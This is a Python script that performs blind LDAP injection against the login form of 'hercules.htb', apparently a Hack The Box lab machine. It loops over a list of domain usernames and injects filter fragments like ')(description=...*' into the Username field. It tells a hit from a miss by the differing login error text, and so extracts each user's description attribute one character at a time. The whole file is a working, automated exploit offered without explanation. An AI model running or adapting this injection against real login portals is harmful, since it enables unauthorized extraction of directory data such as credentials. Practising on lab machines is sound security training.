import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from colorama import Fore, Style

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+ "
URL = "https://hercules.htb/login"
USERS = [
    "adriana.i", "angelo.o", "anthony.r", "ashley.b", "auditor",
    "bob.w", "camilla.b", "clarissa.c", "elijah.m", "fernando.r",
    "fiona.c", "harris.d", "heather.s", "iis_apppoolidentity$",
    "iis_defaultapppool$", "iis_hadesapppool$", "iis_webserver$",
    "jacob.b", "james.s", "jennifer.a", "jessica.e", "joel.c",
    "johanna.f", "johnathan.j", "ken.w", "mark.s", "mikayla.a",
    "natalie.a", "nate.h", "patrick.s", "ramona.l", "ray.n",
    "rene.s", "shae.j", "stephanie.w", "stephen.m", "tanya.r",
    "taylor.m", "tish.c", "vincent.g", "web_admin", "will.s",
    "winda.s", "zeke.s", "Administrator"
]

# Disable SSL warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

set_lock = threading.Lock()
THREADS = 20
DELAY = 2

def log(mode, msg):
    match mode:
        case "success":
            print(Fore.GREEN + f"[+] {msg}" + Style.RESET_ALL)
        case "error":
            print(Fore.RED + f"[-] {msg}" + Style.RESET_ALL)
        case "info":
            print(Fore.BLUE + f"[*] {msg}" + Style.RESET_ALL)
        case "warning":
            print(Fore.YELLOW + f"[!] {msg}" + Style.RESET_ALL)

def get_tokens():
    try:
        r = requests.get(URL, verify=False)
        #print(r.headers['Set-Cookie'][27:-18])
        if 'Set-Cookie' in r.headers:
            cookie = r.headers['Set-Cookie'][27:-18]
            
            soup = BeautifulSoup(r.text, 'html.parser')
            token = soup.find_all("input")[0]['value']
            return (cookie, token)
        else:
            log("error", "FATAL ERROR!")
            log("error", "Failed to obtain request tokens.")
            exit(0)
    except requests.RequestException as e:
        log("error", "FATAL ERROR!")
        log("error", f"get_tokens(): {e}")
        exit(0)

def is_valid(username):
    base_delay = 0
    while True:
        (cookie, token) = get_tokens()
        cookies = {
            "__RequestVerificationToken": cookie
        }
        data = {
            "__RequestVerificationToken": token,
            "Username": username,
            "Password": "test",
            "RememberMe": "false"
        }

        try:
            r = requests.post(URL, cookies=cookies, data=data, verify=False)
            if r.status_code != 200:
                log("error", "FATAL ERROR!")
                log("error", f"Unexpected status code received: {r.status_code}.")
                log("error", f"Response text: {r.text}")
                exit(0)
            
            if "Login attempt failed" in r.text:
                return True
            elif "Invalid login attempt" in r.text:
                return False
            else:
                base_delay += DELAY
                log("warning", f"Empty response received for {username}, retrying after {base_delay} seconds.")
                time.sleep(base_delay)
                continue
        except requests.RequestException as e:
            log("error", "FATAL ERROR!")
            log("error", f"is_valid({username}): {e}")
            exit(0)

def escape(exp):
    return exp.replace("*", "\\2a").replace("(","\\28").replace(")","\\29").replace("=","\\3d").replace("&","\\26").replace(" ","%20").replace("!","\\21").replace("#","\\23").replace("^","\\5e").replace("+","\\2b")

def read_description(user):
    description = ""
    found = False
    while not found:
        for c in CHARSET:
            p = description + str(c)
            print(Fore.BLUE + f"\r[*] {p}                        " + Style.RESET_ALL, end="")

            if is_valid(f"{user}%29%28description%3d{escape(p)}%2a"):
                description += str(c)
                break
            
            if c == CHARSET[-1]:
                found = True
    
    print()
    log("success", f"Description for {user}: {description}")
    return

def main():
    for user in USERS:
        if is_valid(f"{user}%29%28description%3d%2a"):
            log("success", f"{user} has description field set.")
            read_description(user)

    return

if __name__ == "__main__":
    main()